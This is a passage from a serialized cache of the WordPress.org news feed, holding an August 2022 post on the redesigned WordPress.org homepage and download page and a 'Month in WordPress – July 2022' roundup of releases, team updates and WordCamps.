Gleckler</a>,&nbsp;<a href=\"https://profiles.wordpress.org/swissspidy/\">Pascal Birchler</a>,&nbsp;<a href=\"https://profiles.wordpress.org/paulkevan/\">paulkevan</a>,&nbsp;<a href=\"https://profiles.wordpress.org/peterwilsoncc/\">Peter Wilson</a>,&nbsp;<a href=\"https://profiles.wordpress.org/sergeybiryukov/\">Sergey Biryukov</a>,&nbsp;<a href=\"https://profiles.wordpress.org/sabernhardt/\">Stephen Bernhardt</a>,&nbsp;<a href=\"https://profiles.wordpress.org/tykoted/\">Teddy Patriarca</a>,&nbsp;<a href=\"https://profiles.wordpress.org/timothyblynjacobs/\">Timothy Jacobs</a>,&nbsp;<a href=\"https://profiles.wordpress.org/tommusrhodus/\">tommusrhodus</a>,&nbsp;<a href=\"https://profiles.wordpress.org/shimotomoki/\">Tomoki Shimomura</a>, <a href=\"https://profiles.wordpress.org/hellofromtonya/\">Tonya Mork</a>,&nbsp;<a href=\"https://profiles.wordpress.org/webcommsat/\">webcommsat AbhaNonStopNewsUK</a>, and&nbsp;<a href=\"https://profiles.wordpress.org/zieladam/\">zieladam</a>.</p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13346\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:16;a:6:{s:4:\"data\";s:63:\"\n		\n		\n		\n		\n		\n				\n		\n		\n		\n\n					\n										\n					\n		\n		\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:46:\"A New WordPress.org Homepage and Download Page\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:82:\"https://wordpress.org/news/2022/08/a-new-wordpress-org-homepage-and-download-page/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Mon, 15 Aug 2022 15:34:51 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:3:{i:0;a:5:{s:4:\"data\";s:6:\"Design\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:7:\"General\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:2;a:5:{s:4:\"data\";s:4:\"Meta\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=13321\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:350:\"The WordPress experience has significantly evolved in the past few years. In order to highlight the power of WordPress on WordPress.org, the last few weeks have seen a homepage and download page redesign kickoff and shared mockups. Today, these new designs are going live! Like the News pages before them, these refreshed pages are inspired [&#8230;]\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:17:\"Nicholas Garofalo\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:8395:\"\n<p>The WordPress experience has significantly evolved in the past few years. In order to highlight the power of WordPress on WordPress.org, the last few weeks have seen a homepage and download page <a href=\"https://make.wordpress.org/design/2022/07/08/project-kickoff-wordpress-org-homepage-and-download-page-redesign/\">redesign kickoff</a> and <a href=\"https://make.wordpress.org/design/2022/07/27/project-update-wordpress-org-homepage-and-download-page-mockups/\">shared mockups</a>. Today, these new designs are going live! Like <a href=\"https://wordpress.org/news/2022/02/a-new-wordpress-news/\">the News pages before them</a>, these refreshed pages are inspired by the jazzy look &amp; feel WordPress is known for.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img decoding=\"async\" loading=\"lazy\" width=\"1024\" height=\"599\" src=\"https://i2.wp.com/wordpress.org/news/files/2022/08/Featured-Image.png?resize=1024%2C599&#038;ssl=1\" alt=\"\" class=\"wp-image-13327\" srcset=\"https://i2.wp.com/wordpress.org/news/files/2022/08/Featured-Image.png?resize=1024%2C599&amp;ssl=1 1024w, https://i2.wp.com/wordpress.org/news/files/2022/08/Featured-Image.png?resize=300%2C175&amp;ssl=1 300w, https://i2.wp.com/wordpress.org/news/files/2022/08/Featured-Image.png?resize=768%2C449&amp;ssl=1 768w, https://i2.wp.com/wordpress.org/news/files/2022/08/Featured-Image.png?resize=1536%2C898&amp;ssl=1 1536w, https://i2.wp.com/wordpress.org/news/files/2022/08/Featured-Image.png?w=1710&amp;ssl=1 1710w\" sizes=\"(max-width: 1000px) 100vw, 1000px\" data-recalc-dims=\"1\" /></figure>\n\n\n\n<p>The <a href=\"https://wordpress.org/\">new homepage</a> brings more attention to the benefits and experience of using WordPress, while also highlighting the community and resources to get started. </p>\n\n\n\n<p>The <a href=\"https://wordpress.org/download/\">new download page</a> greets visitors with a new layout that makes getting started with WordPress even easier by presenting both the download and hosting options right at the top.</p>\n\n\n\n<p>This redesign was made possible through great collaboration between Design, Marketing, and Meta teams. Thank you to everyone involved throughout this update:</p>\n\n\n\n<p class=\"is-style-wporg-props-long\"><a href=\'https://profiles.wordpress.org/abuzon/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>abuzon</a> <a href=\'https://profiles.wordpress.org/adamwood/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>adamwood</a> <a href=\'https://profiles.wordpress.org/adeebmalik/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>adeebmalik</a> <a href=\'https://profiles.wordpress.org/alexandreb3/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>alexandreb3</a> <a href=\'https://profiles.wordpress.org/alipawp/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>alipawp</a> <a href=\'https://profiles.wordpress.org/angelasjin/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>angelasjin</a> <a href=\'https://profiles.wordpress.org/aniash_29/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>aniash_29</a> <a href=\'https://profiles.wordpress.org/annezazu/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>annezazu</a> <a href=\'https://profiles.wordpress.org/beafialho/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>beafialho</a> <a href=\'https://profiles.wordpress.org/bjmcsherry/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>bjmcsherry</a> <a href=\'https://profiles.wordpress.org/chanthaboune/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>chanthaboune</a> <a href=\'https://profiles.wordpress.org/colinchadwick/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>colinchadwick</a> <a href=\'https://profiles.wordpress.org/crevilaro/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>crevilaro</a> <a href=\'https://profiles.wordpress.org/critterverse/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>critterverse</a> <a href=\'https://profiles.wordpress.org/dansoschin/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>dansoschin</a> <a href=\'https://profiles.wordpress.org/dd32/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>dd32</a> <a href=\'https://profiles.wordpress.org/dufresnesteven/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>dufresnesteven</a> <a href=\'https://profiles.wordpress.org/eboxnet/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>eboxnet</a> <a href=\'https://profiles.wordpress.org/eidolonnight/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>eidolonnight</a> <a href=\'https://profiles.wordpress.org/elmastudio/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>elmastudio</a> <a href=\'https://profiles.wordpress.org/fernandot/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>fernandot</a> <a href=\'https://profiles.wordpress.org/geoffgraham/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>geoffgraham</a> <a href=\'https://profiles.wordpress.org/iandunn/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>iandunn</a> <a href=\'https://profiles.wordpress.org/javiarce/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>javiarce</a> <a href=\'https://profiles.wordpress.org/joedolson/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>joedolson</a> <a href=\'https://profiles.wordpress.org/jpantani/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>jpantani</a> <a href=\'https://profiles.wordpress.org/kellychoffman/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>kellychoffman</a> <a href=\'https://profiles.wordpress.org/laurlittle/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>laurlittle</a> <a href=\'https://profiles.wordpress.org/marybaum/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>marybaum</a> <a href=\'https://profiles.wordpress.org/matt/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>matt</a> <a href=\'https://profiles.wordpress.org/maurodf/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>maurodf</a> <a href=\'https://profiles.wordpress.org/melchoyce/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>melchoyce</a> <a href=\'https://profiles.wordpress.org/mikachan/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>mikachan</a> <a href=\'https://profiles.wordpress.org/nikhilgandal/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>nikhilgandal</a> <a href=\'https://profiles.wordpress.org/pablohoneyhoney/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>pablohoneyhoney</a> <a href=\'https://profiles.wordpress.org/peakzebra/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>peakzebra</a> <a href=\'https://profiles.wordpress.org/poliuk/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>poliuk</a> <a href=\'https://profiles.wordpress.org/priethor/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>priethor</a> <a href=\'https://profiles.wordpress.org/psmits1567/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>psmits1567</a> <a href=\'https://profiles.wordpress.org/renyot/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>renyot</a> <a href=\'https://profiles.wordpress.org/rmartinezduque/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>rmartinezduque</a> <a href=\'https://profiles.wordpress.org/ryelle/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>ryelle</a> <a href=\'https://profiles.wordpress.org/santanainniss/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>santanainniss</a> <a href=\'https://profiles.wordpress.org/sereedmedia/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>sereedmedia</a> <a href=\'https://profiles.wordpress.org/sippis/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>sippis</a> <a href=\'https://profiles.wordpress.org/tellyworth/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>tellyworth</a> <a href=\'https://profiles.wordpress.org/tobifjellner/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>tobifjellner</a> <a href=\'https://profiles.wordpress.org/webdados/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>webdados</a> <a href=\'https://profiles.wordpress.org/willmot/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>willmot</a></p>\n\n\n\n<p>Your comments, including some <a href=\"https://make.wordpress.org/meta/2016/12/12/new-homepage-redesign/\">feedback from the 2016 redesign</a>, were taken into consideration with this work. Expect more updates to come as efforts to jazz up WordPress.org continue.</p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13321\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:17;a:6:{s:4:\"data\";s:60:\"\n		\n		\n		\n		\n		\n				\n		\n		\n\n					\n										\n					\n		\n		\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:36:\"The Month in WordPress – July 2022\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:68:\"https://wordpress.org/news/2022/08/the-month-in-wordpress-july-2022/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Fri, 05 Aug 2022 08:57:12 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:2:{i:0;a:5:{s:4:\"data\";s:18:\"Month in WordPress\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:18:\"month in wordpress\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=13306\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:362:\"July 2022 brought a lot of exciting announcements and proposals for the WordPress project, from an updated timeline for the WordPress 6.1 release, to design updates on WordPress.org. Read on to learn more about the latest news from the community. WordPress 6.1 development cycle is now published Mark your calendars! The WordPress 6.1 development cycle [&#8230;]\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:14:\"rmartinezduque\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:15049:\"\n<p>July 2022 brought a lot of exciting announcements and proposals for the WordPress project, from an updated timeline for the WordPress 6.1 release, to design updates on WordPress.org. Read on to learn more about the latest news from the community.</p>\n\n\n\n<hr class=\"wp-block-separator has-css-opacity\" />\n\n\n\n<h2>WordPress 6.1 development cycle is now published</h2>\n\n\n\n<p>Mark your calendars! The <a href=\"https://make.wordpress.org/core/6-1/\">WordPress 6.1 development cycle</a> has been published along with its release team. The <strong>expected release date</strong> has been updated to <a href=\"https://make.wordpress.org/core/2022/07/26/wordpress-6-1-planning-roundup-v2/\"><strong>November 1, 2022</strong></a>, to incorporate feedback received on the first proposed schedule.</p>\n\n\n\n<p>In the meantime, you can upgrade WordPress to version 6.0.1. This maintenance release became <a href=\"https://wordpress.org/news/2022/07/wordpress-6-0-1-maintenance-release/\">available for download</a> on July 12, 2022, and includes several updates since WordPress 6.0 in May 2022.</p>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\">\n<p>Want to get more involved with WordPress? Join Executive Director Josepha Haden Chomphosy, as she guides you through the five stages of contribution in a <a href=\"https://wordpress.org/news/2022/07/episode-36-beginners-guide-to-contributions-2-0/\">recent episode of WP Briefing</a>.</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>A new look for the WordPress Homepage and Download page</h2>\n\n\n\n<p>Following the revamp of <a href=\"https://wordpress.org/news/\">WordPress.org/News</a> and the <a href=\"https://wordpress.org/gutenberg/\">Gutenberg page</a>, further design updates are coming to WordPress.org to create a fresh and modern user experience that reflects the future of WordPress.</p>\n\n\n\n<p>The WordPress.org home and download pages will be the next pieces to get a refreshed look and feel. The redesign project <a href=\"https://make.wordpress.org/design/2022/07/08/project-kickoff-wordpress-org-homepage-and-download-page-redesign/\">kicked off</a> on July 8, 2022, and the <a href=\"https://make.wordpress.org/meta/2022/08/01/developing-the-redesigned-home-and-download-pages/\">development work</a> is already underway.</p>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\">\n<p>Take a look at the design mockups and <a href=\"https://make.wordpress.org/design/2022/07/27/project-update-wordpress-org-homepage-and-download-page-mockups/\">join the conversation</a>.</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>Gutenberg versions 13.6, 13.7, and 13.8 are here</h2>\n\n\n\n<p>Three new versions of Gutenberg have been released since last month’s edition of The Month in WordPress:</p>\n\n\n\n<ul><li><a href=\"https://make.wordpress.org/core/2022/07/07/whats-new-in-gutenberg-13-6-6-july/\"><strong>Gutenberg 13.6</strong></a> shipped on July 6, 2022. It includes 26 bug fixes and accessibility enhancements. This release also builds on previous work to expand theme.json and to allow you to create a cohesive design across blocks.</li><li><a href=\"https://make.wordpress.org/core/2022/07/20/whats-new-in-gutenberg-13-7-20-july/\"><strong>Gutenberg 13.7</strong></a> brings an updated modal design, the ability to apply block locking to inner blocks, and <a href=\"https://make.wordpress.org/core/2022/07/21/core-editor-improvement-deeper-customization-with-more-template-options/\">new template types</a>, to name a few highlights. It was released on July 20, 2022.</li><li>The latest Gutenberg release, <a href=\"https://make.wordpress.org/core/2022/08/04/whats-new-in-gutenberg-13-8-3-august/\"><strong>version 13.8</strong></a>, went live on August 3, 2022. It comes with ​​fluid typography support among other enhancements, a new feature that will allow you to define text size that can scale and adapt to changes in screen size.</li></ul>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\">\n<p>Follow the <a href=\"https://make.wordpress.org/core/tag/gutenberg-new/\">“What’s new in Gutenberg”</a> posts to stay on top of the latest updates.</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>Team updates: WordPress mobile app changes, pattern previews, Five for the Future improvements</h2>\n\n\n\n<ul><li>The Mobile Team announced last week that it will be <a href=\"https://make.wordpress.org/mobile/2022/07/27/refocusing-the-wordpress-app-on-core-features/\">refocusing the WordPress mobile app on core features</a>. To better serve the needs of all app users and reduce confusion, the Jetpack and WordPress.com features will be moved to a separate app in a gradual process targeted for completion later this year.</li><li>The Community Team is<a href=\"https://make.wordpress.org/community/2022/07/08/call-for-supporters-reactivating-wordpress-meetups-around-the-world/\"> looking for supporters</a> to help reactivate WordPress meetups around the world.</li><li>As part of the ongoing efforts to improve the <a href=\"https://wordpress.org/five-for-the-future/\">Five for the Future</a> (5ftF) initiative, the Meta Team added automated recognition for a number of non-code contributions. <a href=\"https://make.wordpress.org/project/2022/07/28/updates-on-the-five-for-the-future-program-and-proposed-improvements/\">Check out this post</a> to learn more about other proposed improvements to the program.</li><li>The WordPress.org Theme Directory introduced a new feature that allows visitors to <a href=\"https://make.wordpress.org/meta/2022/07/21/pattern-previews-for-themes-in-the-directory-beta/\">preview patterns bundled in a theme</a> without requiring installation.</li><li>The Design Team proposed to release <a href=\"https://make.wordpress.org/design/2022/07/19/proposal-a-new-kind-of-default-theme/\">a curated set of style variations</a> designed by the community (instead of a new default theme) for WordPress 6.1.</li><li>Josepha Haden Chomphosy reflected on progress towards the 2022 goals of the WordPress project in this <a href=\"https://make.wordpress.org/updates/2022/07/25/a-mid-year-year-look-at-2022-goals/\">mid-year review</a>.</li><li>Over the past few months, the Training Team published six tutorials along with a variety of lesson plans and online workshops. See what&#8217;s new in this <a href=\"https://make.wordpress.org/updates/2022/07/15/whats-new-on-learnwp-in-july-2022/\">summary post</a>.</li><li>Curious about how the WordPress 6.0 release process went? Read this <a href=\"https://make.wordpress.org/core/2022/07/07/wordpress-6-0-retrospective-recap/\">WordPress 6.0 retrospective recap</a> for insights.</li><li>The Themes Team shared a follow-up post to address questions about the <a href=\"https://make.wordpress.org/themes/2022/07/28/using-locally-hosted-google-fonts-in-themes/\">use of locally-hosted Google fonts in themes</a>.</li><li>There is an open <a href=\"https://make.wordpress.org/accessibility/2022/07/15/call-team-rep-nomination-july-2022/\">call for a new Accessibility Team Representative</a>.</li><li>The Performance Team has a new dedicated Make blog. Follow updates on their work and proposals at <a href=\"https://make.wordpress.org/performance\">make.wordpress.org/performance</a>.</li><li>The July 2022 edition of the <a href=\"https://make.wordpress.org/polyglots/2022/07/22/polyglots-monthly-newsletter-july-2022/\">Polyglots Monthly Newsletter</a> is live.</li><li>The latest edition of People of WordPress highlights <a href=\"https://wordpress.org/news/2022/07/people-of-wordpress-carla-doria/\">Carla Doria</a>, a customer support specialist from South America.</li><li><a href=\"https://make.wordpress.org/community/2022/07/22/july-meetup-organizer-newsletter/\">July’s Meetup Organizer Newsletter</a> features several tips and tools for engaging and growing your community.</li></ul>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\">\n<p>WP Briefing celebrated <a href=\"https://wordpress.org/news/2022/08/episode-37-the-world-of-wordpress-on-world-wide-web-day/\">World Wide Web Day 2022 with a special episode</a>!<strong> </strong>Tune in to hear contributors from the community reflect on how WordPress impacts their world.</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>Feedback &amp; testing requests</h2>\n\n\n\n<ul><li>Josepha Haden Chomphosy suggested giving Full Site Editing (FSE) a more user-friendly name. <a href=\"https://make.wordpress.org/core/2022/07/27/giving-fse-a-more-user-friendly-name/\">Share your thoughts in this post</a>.</li><li>The <a href=\"https://make.wordpress.org/core/2022/07/21/request-for-feedback-feature-notifications-proof-of-concept/\">WordPress Notifications Feature project</a> is ready to begin collecting feedback. Efforts to help test the feature plugin and comments are welcome.</li><li>The Training Team kicked off a discussion to gather feedback on <a href=\"https://make.wordpress.org/training/2022/07/11/exploring-wordpress-certifications/\">how WordPress certifications should be approached</a>.</li><li>The Performance Team shared a few proposals to integrate new features targeting the WordPress 6.1 release. You can help by testing, reporting bugs, or contributing fixes and ideas:<ul><li><a href=\"https://make.wordpress.org/core/2022/07/13/proposal-persistent-object-cache-and-full-page-cache-site-health-checks/\">Proposal: Persistent Object Cache and Full Page Cache Site Health Checks</a></li><li><a href=\"https://make.wordpress.org/core/2022/07/21/proposal-add-a-dominant-color-background-to-images/\">Proposal: Add a dominant color background to images</a></li></ul></li><li>Version 20.4 of WordPress for <a href=\"https://make.wordpress.org/mobile/2022/07/26/call-for-testing-wordpress-for-android-20-4/\">Android</a> and <a href=\"https://make.wordpress.org/mobile/2022/07/25/call-for-testing-wordpress-for-ios-20-4/\">iOS</a> is available for testing.</li></ul>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\">\n<p>The Community Team is calling on all meetup members and organizers to <a href=\"https://make.wordpress.org/community/2022/08/02/announcing-the-2021-2022-annual-meetup-survey/\">complete the 2021-2022 Annual Meetup Survey</a>. Your feedback will help strengthen the WordPress meetup program for years to come. Please respond and help spread the word.</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>WordCamp updates</h2>\n\n\n\n<ul><li>WordCamp US is only five weeks away! The organizing team announced the <a href=\"https://us.wordcamp.org/2022/2022-kim-parsell-memorial-scholarship-recipients/\">Kim Parsell Memorial Scholarship recipients</a> for this year. Congratulations to <a href=\"https://profiles.wordpress.org/margheweb/\">Margherita Pelonara</a>, <a href=\"https://profiles.wordpress.org/simo70/\">Simona Simionato</a>, and <a href=\"https://profiles.wordpress.org/webtechpooja/\">Pooja Derashri</a>!</li><li><a href=\"https://us.wordcamp.org/2022/underrepresented-speaker-supporters/\">20 organizations</a> have stepped forward to support underrepresented speakers from all over the world to get to WordCamp US 2022. Visit the <a href=\"https://us.wordcamp.org/2022/underrepresented-speaker-support/\">Underrepresented Speaker Support page</a> to donate to the fund or ask for support if you are part of an underrepresented group.</li><li>WordCamp Asia 2023 opened a new <a href=\"https://asia.wordcamp.org/2023/call-for-speakers-is-now-open/\">Call for Speakers</a> and <a href=\"https://asia.wordcamp.org/2023/call-for-media-partners/\">Media Partners</a>. The deadline for speaker applications is September 15, 2022. The organizing team also shared more details on the <a href=\"https://asia.wordcamp.org/2023/wordcamp-asia-2023-ticket-release-timeline/\">ticket release timeline</a>.</li><li>Don’t miss these upcoming WordCamps:<ul><li><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/1f1fa-1f1ec.png\" alt=\"🇺🇬\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> <a href=\"https://jinja.wordcamp.org/2022/\">WordCamp Jinja</a>, Uganda on September 2-3, 2022</li><li><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/1f1f3-1f1f5.png\" alt=\"🇳🇵\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> <a href=\"https://kathmandu.wordcamp.org/2022/\">WordCamp Kathmandu</a>, Nepal on September 3-4, 2022</li><li><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/1f1fa-1f1f8.png\" alt=\"🇺🇸\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> <a href=\"https://us.wordcamp.org/2022/\">WordCamp US</a> in San Diego, California on September 9-11, 2022</li><li><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/1f1f3-1f1f1.png\" alt=\"🇳🇱\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> <a href=\"https://netherlands.wordcamp.org/2022/\">WordCamp Netherlands</a>, The Netherlands on September 15-16, 2022</li><li><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/1f1ea-1f1f8.png\" alt=\"🇪🇸\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> <a href=\"https://pontevedra.wordcamp.org/2022/\">WordCamp Pontevedra</a>, Spain on September 24-25, 2022</li></ul></li></ul>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\">\n<p>Join #WPDiversity with a free, online speaker workshop for Indian women in the WordPress community. The event will take place on September 24-25, 2022. <a href=\"https://www.eventbrite.com/e/speaker-workshop-for-indian-women-in-the-wordpress-community-sept-24-25-tickets-348466712317\">Sign up now</a>!</p>\n</blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<hr class=\"wp-block-separator has-css-opacity\" />\n\n\n\n<p><strong><em><strong><em><strong><em>Have a story that we should include in the next issue of The Month in WordPress? Let us know by filling out </em></strong><a href=\"https://make.wordpress.org/community/month-in-wordpress-submissions/\"><strong><em>this form</em></strong></a><strong><em>.</em></strong></em></strong></em></strong></p>\n\n\n\n<p><em><em>The following folks contributed to this edition of The Month in WordPress: <a href=\'https://profiles.wordpress.org/chaion07/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>chaion07</a>, <a href=\'https://profiles.wordpress.org/laurlittle/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>laurlittle</a>, <a href=\'https://profiles.wordpress.org/mysweetcate/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>mysweetcate</a>, <a href=\'https://profiles.wordpress.org/sereedmedia/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>sereedmedia</a>, <a href=\'https://profiles.wordpress.org/dansoschin/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>dansoschin</a>, <a 